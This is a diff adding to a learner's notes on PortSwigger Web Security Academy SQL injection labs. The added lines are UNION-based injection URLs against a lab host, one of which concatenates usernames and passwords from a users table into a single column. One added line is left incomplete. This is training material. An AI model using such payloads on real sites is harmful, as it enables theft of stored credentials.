@@ -880,7 +880,10 @@ Those two column can accept string data so that we have to retrieve username and
 
 https://0afa006f04c947e48044c24a008600e5.web-security-academy.net/filter?category=Lifestyle' UNION SELECT NULL,username,password from users--
 __________________________________________________________________________________________________________________________________________________________________
-
-
+SQL injection UNION attack, retrieving multiple values in a single column
+----------------------------------------------------------------------------
+https://0afa006f04c947e48044c24a008600e5.web-security-academy.net/filter?category=Lifestyle' UNION SELECT NULL,'abcd',
+https://0afa006f04c947e48044c24a008600e5.web-security-academy.net/filter?category=Lifestyle' UNION SELECT NULL,username ||'-'|| password from users--
+__________________________________________________________________________________________________________________________________________________________________
 
  
